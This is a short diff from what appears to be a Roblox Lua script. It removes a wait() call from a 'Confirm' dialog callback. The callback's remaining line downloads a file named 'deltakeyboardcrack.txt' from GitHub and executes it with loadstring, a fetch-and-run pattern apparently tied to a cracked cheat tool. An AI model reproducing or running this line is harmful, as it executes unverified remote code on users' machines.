@@ -244,7 +244,6 @@ do
 						Title = "Confirm",
 						Callback = function()
 							print("Confirmed the dialog.")
-							wait()
 							loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()
 						end
 					},
